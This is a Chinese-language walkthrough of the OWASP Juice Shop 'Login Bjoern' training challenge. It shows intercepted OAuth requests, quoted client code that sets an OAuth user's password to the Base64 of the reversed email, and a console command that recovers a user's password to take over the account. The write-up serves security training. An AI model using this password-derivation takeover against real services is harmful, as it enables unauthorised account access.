---
title: Login Bjoern
description: 观察 OAuth 的过程，确定其传递参数的方式，查看代码确定如何处理参数，得到 OAuth 账户的默认密码创建方法。使用此方法得到明文密码
---

- 描述：Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account.
- 在管理员页面或查询用户表，已知邮件地址为
    ```bjoern.kimminich@gmail.com```
    已知密码 MD5 散列为
    ```6edd9d726cbdc873c539e41ae8757b8c```
    查表对应密码明文
    ```bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=```
- 使用明文登录账户

- 提示：仔细研究如何实现 Google 的 OAuth 登录。

- 完成 OAuth 验证后
    - 在账户不存在的情况下创建新账户
        ```POST /api/Users/ HTTP/1.1```
        ```json
        {
            "email": "test@gmail.com",
            "password": "Base64 编码的密码",
            "passwordRepeat": "Base64 编码的密码"
        }
        ```
    - 并且自动登录
        ```POST /rest/user/login HTTP/1.1```
        ```json
        {
            "email": "test@gmail.com",
            "password": "Base64 编码的密码",
            "oauth": true
        }
        ```
- 在账户已创建的情况下，点击 OAuth 登录时，实际上仍然拥有创建与登录这两步
- 与常规登录不同之处在于 ```"oauth": true``` 字段
- 上述内容均在拦截代理服务器中
    但在 ```Host: accounts.google.com```的最后一步
    包含hash片段符的重定向
    ```https://local3000.owasp-juice.shop#access_token=```
    之后再重定向回到 ```http://127.0.0.1:3000/```
    - 即，此过程中的 hash 片段符一直传递到本机的 juice shop 中，其中应当包含凭证信息

- 查看示例解决方案
- 在 ```main.js```中搜索 ```oauth```
    ```javascript
    var e = this;
    this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe({
        next: o => {
            const a = btoa(o.email.split("").reverse().join(""));
            this.userService.save({
                email: o.email,
                password: a,
                passwordRepeat: a
            }).subscribe({
                next: () => {
                    this.login(o)
                },
                error: () => {
                    this.login(o)
                }
            })
        }
    })
    ```
    - 此处即为对 URL 字符串的解析
    - 读取邮件字符串后逆向排序再进行 Base64 编码作为密码
    - 之后对应保存账户与登录账户的步骤
    - 浏览器控制台输入
        ```javascript
        btoa('bjoern.kimminich@gmail.com'.split("").reverse().join(""))
        ```
        得到与之前查表得到的明文相同的字符串 
        ```bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=```